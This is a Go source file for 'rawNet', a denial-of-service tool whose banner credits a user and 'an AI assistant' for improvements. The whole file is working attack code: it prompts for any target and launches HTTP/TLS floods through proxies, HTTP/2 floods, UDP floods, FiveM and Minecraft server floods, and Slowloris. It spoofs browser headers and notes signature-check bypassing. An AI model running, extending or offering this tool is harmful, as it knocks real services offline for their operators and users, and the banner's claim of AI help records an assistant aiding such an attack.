package main

import (
	"bufio"
	"bytes"
	"context"
	"crypto/tls"
	"encoding/binary"
	"fmt"
	"io"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"os"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"golang.org/x/net/http2"
)

const (
	Reset    = "\033[0m"
	RedLight = "\033[91m"
	Green    = "\033[32m"
	Yellow   = "\033[33m"
	Cyan     = "\033[36m"
	Magenta  = "\033[35m"
	Blue     = "\033[34m"
)

var userAgents []string
var referers []string
var methodsHTTP = []string{"GET", "POST", "HEAD", "PUT", "DELETE", "PATCH", "OPTIONS"}
var proxies []string

// Added a global seed for random number generation for consistency and safety.
func init() {
	rand.Seed(time.Now().UnixNano())
}

func printBanner() {
	fmt.Print(RedLight, `
         
          RAW NETWORK V2🔥🔥
         
`, Reset)

	fmt.Print(Cyan, `

 rawNet v8.1 - Enhanced Edition
         
Made by darkunder6969 and improved by an AI assistant
`, Reset)
}

// -----------------------------------------------------------------------------
// Utility Functions
// -----------------------------------------------------------------------------

func loadListFromFile(filename string) []string {
	file, err := os.Open(filename)
	if err != nil {
		// Log the error for better debugging
		fmt.Printf("%sWarning: Could not open %s: %v%s\n", Yellow, filename, err, Reset)
		return nil
	}
	defer file.Close()
	var list []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line != "" {
			list = append(list, line)
		}
	}
	return list
}

func randomFromList(list []string, fallback string) string {
	if len(list) == 0 {
		return fallback
	}
	return list[rand.Intn(len(list))]
}

func randomUserAgent() string {
	return randomFromList(userAgents, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
}

func randomReferer() string {
	return randomFromList(referers, "https://google.com/")
}

func randomMethod() string {
	return methodsHTTP[rand.Intn(len(methodsHTTP))]
}

func randomPath() string {
	chars := "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	// Path length between 5 and 14 (rand.Intn(10) is 0-9)
	b := make([]byte, rand.Intn(10)+5)
	for i := range b {
		b[i] = chars[rand.Intn(len(chars))]
	}
	return "/" + string(b)
}

func formatBytes(bytes float64) string {
	units := []string{"Bps", "KBps", "MBps", "GBps", "TBps"}
	i := 0
	// Use 1000 for standard Bps/MBps display, or 1024 for storage/memory.
	// Since this is for network rate, 1000 is often preferred in reporting.
	const unit = 1000.0
	for bytes >= unit && i < len(units)-1 {
		bytes /= unit
		i++
	}
	return fmt.Sprintf("%.2f %s", bytes, units[i])
}

// Helper to safely read an integer or use a fallback.
func readIntInput(reader *bufio.Reader, prompt string, fallback int) int {
	fmt.Print(Yellow + prompt + Reset)
	input, _ := reader.ReadString('\n')
	input = strings.TrimSpace(input)
	val, err := strconv.Atoi(input)
	if err != nil || val <= 0 {
		return fallback
	}
	return val
}

// Helper to safely read a float64 or use a fallback.
func readFloatInput(reader *bufio.Reader, prompt string, fallback float64) float64 {
	fmt.Print(Yellow + prompt + Reset)
	input, _ := reader.ReadString('\n')
	input = strings.TrimSpace(input)
	val, err := strconv.ParseFloat(input, 64)
	if err != nil || val <= 0 {
		return fallback
	}
	return val
}

// -----------------------------------------------------------------------------
// HTTP Client Management
// -----------------------------------------------------------------------------

// Renamed for clarity: newHTTPClientWithProxy
func newHTTPClientWithProxy(proxyStr string, connections int, timeout time.Duration) *http.Client {
	proxyURL, err := url.Parse(proxyStr)
	if err != nil {
		// Fallback to no proxy if parsing fails
		proxyURL = nil
	}

	tr := &http.Transport{
		Proxy:               http.ProxyURL(proxyURL),
		MaxIdleConns:        connections * 2,
		MaxIdleConnsPerHost: connections * 2,
		IdleConnTimeout:     10 * time.Second,
		DisableCompression:  true,
		TLSClientConfig:     &tls.Config{InsecureSkipVerify: true}, // Allows self-signed certs
		ForceAttemptHTTP2:   true,
	}
	// Use a wrapper to configure HTTP/2 on the transport
	if err := http2.ConfigureTransport(tr); err != nil {
		// Log error but continue with H1 if H2 fails configuration
		fmt.Printf("%sWarning: Failed to configure HTTP/2: %v%s\n", Yellow, err, Reset)
	}

	return &http.Client{
		Transport: tr,
		Timeout:   timeout,
	}
}

// newHTTP2Client now just configures a standard H2 client without proxy.
func newHTTP2Client(connections int, timeout time.Duration) *http.Client {
	tr := &http.Transport{
		MaxIdleConns:        connections * 2,
		MaxIdleConnsPerHost: connections * 2,
		IdleConnTimeout:     10 * time.Second,
		DisableCompression:  true,
		TLSClientConfig:     &tls.Config{InsecureSkipVerify: true},
		ForceAttemptHTTP2:   true, // Force H2 attempt
	}
	// Ensure HTTP/2 is properly configured
	if err := http2.ConfigureTransport(tr); err != nil {
		fmt.Printf("%sWarning: Failed to configure HTTP/2: %v%s\n", Yellow, err, Reset)
	}

	return &http.Client{
		Transport: tr,
		Timeout:   timeout,
	}
}

// -----------------------------------------------------------------------------
// HTTP Request Handlers
// -----------------------------------------------------------------------------

func sendHTTP2Request(client *http.Client, targetURL string) bool {
	// Use a random method to bypass simple signature checks
	req, err := http.NewRequest(randomMethod(), targetURL, nil)
	if err != nil {
		return false
	}

	// HTTP/2 specific headers with better spoofing
	req.Header.Set("User-Agent", randomUserAgent())
	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8")
	req.Header.Set("Accept-Encoding", "gzip, deflate, br")
	req.Header.Set("Accept-Language", "en-US,en;q=0.9")
	req.Header.Set("Cache-Control", "no-cache")
	req.Header.Set("Pragma", "no-cache")
	req.Header.Set("Referer", randomReferer())

	// Add new spoofing headers
	req.Header.Set("Sec-Ch-Ua", "\"Chromium\";v=\"120\", \"Not-A.Brand\";v=\"24\"")
	req.Header.Set("Sec-Ch-Ua-Mobile", "?0")
	req.Header.Set("Sec-Ch-Ua-Platform", "\"Windows\"")
	req.Header.Set("Sec-Fetch-Dest", "document")
	req.Header.Set("Sec-Fetch-Mode", "navigate")
	req.Header.Set("Sec-Fetch-Site", "same-origin") // Changed from cross-site for better realism
	req.Header.Set("Te", "trailers")

	resp, err := client.Do(req)
	if err != nil {
		return false
	}
	defer resp.Body.Close()
	// Read a small amount to ensure response is processed, but discard quickly.
	io.CopyN(io.Discard, resp.Body, 1024)
	return resp.StatusCode >= 200 && resp.StatusCode < 500
}

func sendTLSRequest(client *http.Client, baseURL string) bool {
	req, err := http.NewRequest(randomMethod(), baseURL+randomPath(), nil)
	if err != nil {
		return false
	}
	// Improved header set for better spoofing
	req.Header.Set("User-Agent", randomUserAgent())
	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
	req.Header.Set("Cache-Control", "no-cache")
	req.Header.Set("Pragma", "no-cache")
	req.Header.Set("Referer", randomReferer())
	req.Header.Set("Connection", "keep-alive")

	resp, err := client.Do(req)
	if err != nil {
		return false
	}
	defer resp.Body.Close()
	// Read a small amount to ensure response is processed, but discard quickly.
	io.CopyN(io.Discard, resp.Body, 1024)
	return resp.StatusCode >= 200 && resp.StatusCode < 500
}

// -----------------------------------------------------------------------------
// Layer 4/7 Flood Helpers
// -----------------------------------------------------------------------------

func generatePayload(size int) []byte {
	payload := make([]byte, size)
	// Random bytes for better obfuscation
	if _, err := rand.Read(payload); err != nil {
		// Fallback to simple loop on error
		for i := range payload {
			payload[i] = byte(rand.Intn(256))
		}
	}
	return payload
}

func writeVarInt(buf *bytes.Buffer, value int32) {
	for {
		temp := byte(value & 0x7F)
		value >>= 7
		if value != 0 {
			temp |= 0x80
		}
		buf.WriteByte(temp)
		if value == 0 {
			break
		}
	}
}

// -----------------------------------------------------------------------------
// Worker Implementations
// -----------------------------------------------------------------------------

// Renamed and improved for concurrent use
func minecraftWorker(ctx context.Context, wg *sync.WaitGroup, target string, port int, workers int) {
	defer wg.Done()
	addr := fmt.Sprintf("%s:%d", target, port)

	// One goroutine per "worker"
	for i := 0; i < workers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for {
				select {
				case <-ctx.Done():
					return
				default:
					conn, err := net.DialTimeout("tcp", addr, 5*time.Second) // Added timeout
					if err != nil {
						time.Sleep(100 * time.Millisecond) // Don't hammer on failure
						continue
					}
					// No need to track packets/bytes for a Layer 7 handshake DoS, only connection count matters.

					// Send multiple handshakes per connection
					for j := 0; j < 5; j++ {
						buf := new(bytes.Buffer)
						protocolVersion := int32(754) // Modern protocol version
						writeVarInt(buf, protocolVersion)
						writeVarInt(buf, int32(len(target)))
						buf.WriteString(target)
						binary.Write(buf, binary.BigEndian, uint16(port))
						writeVarInt(buf, 1) // Next state: Status

						handshakePacket := new(bytes.Buffer)
						writeVarInt(handshakePacket, int32(buf.Len()))
						handshakePacket.WriteByte(0x00) // Packet ID for Handshake
						handshakePacket.Write(buf.Bytes())
						conn.Write(handshakePacket.Bytes())

						// Send a Status Request (0x00) to keep the connection alive/busy
						statusBuf := new(bytes.Buffer)
						writeVarInt(statusBuf, 1) // Length
						statusBuf.WriteByte(0x00) // Packet ID for Status Request
						conn.Write(statusBuf.Bytes())
					}

					// Keep the connection open for a short period after sending
					// to overload the server's connection table
					time.Sleep(1 * time.Second)
					conn.Close()
				}
			}
		}()
	}
}

type FivemWorker struct {
	Target string
	Port   int
	Burst  int
}

func (fw *FivemWorker) Start(ctx context.Context, wg *sync.WaitGroup, totalSuccess *int64, totalBytes *int64) {
	defer wg.Done()
	addr := fmt.Sprintf("%s:%d", fw.Target, fw.Port)

	for {
		select {
		case <-ctx.Done():
			return
		default:
			conn, err := net.Dial("udp", addr)
			if err != nil {
				time.Sleep(100 * time.Millisecond)
				continue
			}
			defer conn.Close() // Close inside the loop for new connections

			payload := []byte("\xff\xff\xff\xffgetinfo xxx\x00\x00\x00")
			largePayload := generatePayload(1024)

			for i := 0; i < fw.Burst; i++ {
				var p []byte
				if i%2 == 0 {
					p = payload
				} else {
					p = largePayload
				}

				if _, err := conn.Write(p); err == nil {
					atomic.AddInt64(totalSuccess, 1)
					atomic.AddInt64(totalBytes, int64(len(p)))
				}
			}
			conn.Close() // Ensure the connection is closed here
			time.Sleep(10 * time.Millisecond)
		}
	}
}

// UDP Flood Worker
type UDPWorker struct {
	Target string
	Port   int
	Size   int
}

func (uw *UDPWorker) Start(ctx context.Context, wg *sync.WaitGroup, totalSuccess *int64, totalBytes *int64) {
	defer wg.Done()
	addr := fmt.Sprintf("%s:%d", uw.Target, uw.Port)
	payload := generatePayload(uw.Size)

	// For maximum UDP speed, reuse the connection object outside the inner loop
	conn, err := net.Dial("udp", addr)
	if err != nil {
		return
	}
	defer conn.Close()

	for {
		select {
		case <-ctx.Done():
			return
		default:
			if _, err := conn.Write(payload); err == nil {
				atomic.AddInt64(totalSuccess, 1)
				atomic.AddInt64(totalBytes, int64(len(payload)))
			}
		}
	}
}

// HTTP/2 Specific Worker
type HTTP2Worker struct {
	Target  string
	UseTLS  bool
	Workers int
	Timeout time.Duration
}

func (hw *HTTP2Worker) Start(ctx context.Context, wg *sync.WaitGroup, totalSuccess *int64, totalFail *int64) {
	defer wg.Done()

	// HTTP/2 clients should ideally be reused for multiple requests
	client := newHTTP2Client(hw.Workers, hw.Timeout)
	protocol := "http"
	if hw.UseTLS {
		protocol = "https"
	}
	targetURL := fmt.Sprintf("%s://%s", protocol, hw.Target)

	for {
		select {
		case <-ctx.Done():
			return
		default:
			// No need for a loop here, the workers-per-connection is handled by MaxIdleConnsPerHost.
			if sendHTTP2Request(client, targetURL+randomPath()) {
				atomic.AddInt64(totalSuccess, 1)
			} else {
				atomic.AddInt64(totalFail, 1)
			}
		}
	}
}

// Slowloris Worker Implementation
func slowlorisWorker(ctx context.Context, wg *sync.WaitGroup, target string, port int) {
	defer wg.Done()
	addr := fmt.Sprintf("%s:%d", target, port)

	for {
		select {
		case <-ctx.Done():
			return
		default:
			// Use DialTimeout to prevent indefinite blocking
			conn, err := net.DialTimeout("tcp", addr, 10*time.Second)
			if err != nil {
				time.Sleep(500 * time.Millisecond)
				continue
			}

			// Send partial HTTP request
			headers := fmt.Sprintf("GET /%s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\n",
				randomPath(), target, randomUserAgent())
			if _, err := conn.Write([]byte(headers)); err != nil {
				conn.Close()
				continue
			}

			// Keep connection open by sending headers slowly
			ticker := time.NewTicker(15 * time.Second)
			defer ticker.Stop()
			conn.SetDeadline(time.Now().Add(time.Minute * 5)) // Set a long deadline

		KeepAlive:
			for {
				select {
				case <-ticker.C:
					// Send a minimal header to keep the server waiting for the rest of the request.
					if _, err := conn.Write([]byte(fmt.Sprintf("X-a%d: b\r\n", rand.Intn(1000)))); err != nil {
						break KeepAlive
					}
					conn.SetDeadline(time.Now().Add(time.Minute * 5)) // Extend deadline
				case <-ctx.Done():
					break KeepAlive
				}
			}
			conn.Close()
		}
	}
}

// -----------------------------------------------------------------------------
// Main Attack Loop
// -----------------------------------------------------------------------------

func runAttack() {
	reader := bufio.NewReader(os.Stdin)
	userAgents = loadListFromFile("useragents.txt")
	referers = loadListFromFile("referers.txt")
	proxies = loadListFromFile("http.txt")

	// Input handling is now better
	fmt.Print(Yellow + "Target (e.g., example.com): " + Reset)
	target, _ := reader.ReadString('\n')
	target = strings.TrimSpace(target)

	if target == "" {
		fmt.Println(RedLight + "Error: Target cannot be empty." + Reset)
		return
	}

	fmt.Print(Yellow + "Select method:\n" +
		"http-tls\nhttp2-tls\nudp-flood\nudp-gbps\nfivem\nminecraft\nslowloris\n" + Reset)
	mode, _ := reader.ReadString('\n')
	mode = strings.TrimSpace(strings.ToLower(mode))

	// Improved input using helper functions
	connections := readIntInput(reader, "Connections per worker (default: 10): ", 10)
	workers := readIntInput(reader, "Number of workers (default: 10): ", 10)
	port := readIntInput(reader, "Port (default: 80/443, use 25565 for minecraft, etc.): ", 80)
	durationSec := readIntInput(reader, "Duration (seconds, default: 30): ", 30)
	timeout := readIntInput(reader, "Timeout (seconds, default: 6): ", 6)

	timeoutDuration := time.Duration(timeout) * time.Second

	// Set default ports based on mode if user entered 80 (common default)
	if port == 80 {
		if strings.Contains(mode, "tls") || strings.Contains(mode, "https") {
			port = 443
		} else if mode == "minecraft" {
			port = 25565
		} else if mode == "fivem" {
			port = 30120
		}
	}

	fmt.Println(Green + "Attack starting..." + Reset)

	var totalSuccess, totalFail, totalBytes int64
	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(durationSec)*time.Second)
	defer cancel()
	var wg sync.WaitGroup

	switch mode {
	case "tls", "http-tls":
		// Enforce HTTPS if target port is 443
		baseURL := fmt.Sprintf("http://%s:%d", target, port)
		if port == 443 {
			baseURL = fmt.Sprintf("https://%s:%d", target, port)
		}

		for i := 0; i < workers; i++ {
			wg.Add(1)
			go func() {
				defer wg.Done()
				proxy := randomFromList(proxies, "")
				client := newHTTPClientWithProxy(proxy, connections, timeoutDuration)
				for {
					select {
					case <-ctx.Done():
						return
					default:
						// Loop to create connections per worker
						for j := 0; j < connections; j++ {
							if sendTLSRequest(client, baseURL) {
								atomic.AddInt64(&totalSuccess, 1)
							} else {
								atomic.AddInt64(&totalFail, 1)
							}
						}
					}
				}
			}()
		}

	case "http2", "http2-tls":
		// Protocol determined by port/mode
		useTLS := port == 443 || mode == "http2-tls"
		for i := 0; i < workers; i++ {
			wg.Add(1)
			worker := &HTTP2Worker{
				Target:  fmt.Sprintf("%s:%d", target, port),
				UseTLS:  useTLS,
				Workers: connections,
				Timeout: timeoutDuration,
			}
			go worker.Start(ctx, &wg, &totalSuccess, &totalFail)
		}

	case "udp-flood", "udp-bypass", "udp-gbps":
		packetSize := 512
		if mode == "udp-gbps" {
			packetSize = 1472 // Max safe payload size before IP fragmentation
		} else if mode == "udp-bypass" {
			packetSize = 128
		}

		for i := 0; i < workers; i++ {
			wg.Add(1)
			worker := &UDPWorker{
				Target: target,
				Port:   port,
				Size:   packetSize,
			}
			go worker.Start(ctx, &wg, &totalSuccess, &totalBytes)
		}

	case "minecraft":
		// FIX: Correctly wrap minecraftWorker in a goroutine and a WaitGroup
		// This worker does not track bytes, only connections (successes)
		wg.Add(1)
		go minecraftWorker(ctx, &wg, target, port, workers)

	case "fivem":
		// Better input for upload rate
		uploadMbps := readFloatInput(reader, "Upload in Mbps (e.g., 0.84, default: 1.0): ", 1.0)
		// Burst calculation is an approximation: packets per 10ms (100 bursts/sec)
		// 1 Mbps = 125,000 Bytes/s. (125000 / 100) / 1024 (avg payload size) ~ 1.22
		// A burst of 10-20 packets is more realistic for a single thread at 1 Mbps
		burst := int(uploadMbps * 10) // Simplified burst rate
		if burst < 1 {
			burst = 1
		}

		for i := 0; i < workers; i++ {
			wg.Add(1)
			worker := &FivemWorker{
				Target: target,
				Port:   port,
				Burst:  burst,
			}
			go worker.Start(ctx, &wg, &totalSuccess, &totalBytes)
		}

	case "slowloris":
		// FIX: Correctly wrap slowlorisWorker in a goroutine
		for i := 0; i < workers; i++ {
			wg.Add(1)
			go slowlorisWorker(ctx, &wg, target, port)
		}

	default:
		fmt.Println(RedLight + "Error: Invalid attack method selected." + Reset)
		return
	}

	// Progress tracker
	go func() {
		ticker := time.NewTicker(1 * time.Second)
		defer ticker.Stop()
		remaining := durationSec
		startTime := time.Now()

		for range ticker.C {
			remaining--
			elapsed := time.Since(startTime).Seconds()
			if elapsed < 1 {
				elapsed = 1
			} // Avoid division by zero/near-zero

			var rate float64

			if strings.Contains(mode, "http") || mode == "tls" || mode == "slowloris" {
				total := atomic.LoadInt64(&totalSuccess) + atomic.LoadInt64(&totalFail)
				rate = float64(total) / elapsed
				fmt.Printf("\r%sTime: %ds | Reqs: %d | Rate: %.1f/s | Success: %d | Fail: %d%s",
					Blue, durationSec-remaining, total, rate, atomic.LoadInt64(&totalSuccess), atomic.LoadInt64(&totalFail), Reset)
			} else {
				bytes := atomic.LoadInt64(&totalBytes)
				rate = float64(bytes) / elapsed // Bytes per second
				fmt.Printf("\r%sTime: %ds | Pkts: %d | Rate: %s | Bytes Sent: %s%s",
					Blue, durationSec-remaining, atomic.LoadInt64(&totalSuccess), formatBytes(rate), formatBytes(float64(bytes)), Reset)
			}

			if remaining <= 0 {
				break
			}
		}
		fmt.Println()
	}()

	// Wait for all workers to finish (either by context or error)
	wg.Wait()

	// -----------------------------------------------------------------------------
	// Final Summary
	// -----------------------------------------------------------------------------

	fmt.Println(Magenta + "\nAttack complete. Results:" + Reset)
	if strings.Contains(mode, "http") || mode == "tls" || mode == "slowloris" || mode == "minecraft" {
		total := atomic.LoadInt64(&totalSuccess) + atomic.LoadInt64(&totalFail)
		rps := float64(total) / float64(durationSec)
		fmt.Printf("%sSuccess requests/connections : %d%s\n", Green, totalSuccess, Reset)
		fmt.Printf("%sFailed requests/connections  : %d%s\n", RedLight, totalFail, Reset)
		fmt.Printf("%sTotal requests/connections   : %d%s\n", Cyan, total, Reset)
		fmt.Printf("%sDuration                   : %d seconds%s\n", Cyan, durationSec, Reset)
		fmt.Printf("%sAverage RPS                : %.2f req/sec%s\n", Yellow, rps, Reset)
	} else {
		bps := float64(totalBytes) / float64(durationSec)
		fmt.Printf("%sSuccess packets/writes : %d%s\n", Green, totalSuccess, Reset)
		fmt.Printf("%sTotal bytes sent       : %s%s\n", Cyan, formatBytes(float64(totalBytes)), Reset)
		fmt.Printf("%sDuration               : %d seconds%s\n", Cyan, durationSec, Reset)
		fmt.Printf("%sAverage BPS            : %s%s\n", Yellow, formatBytes(bps), Reset)
	}
}

func main() {
	printBanner()
	reader := bufio.NewReader(os.Stdin)
	for {
		runAttack()
		fmt.Print(Yellow + "\nStart another attack? (y/n): " + Reset)
		again, _ := reader.ReadString('\n')
		again = strings.TrimSpace(strings.ToLower(again))
		if again != "y" {
			fmt.Println(Green + "Script stopped" + Reset)
			break
		}
	}
}
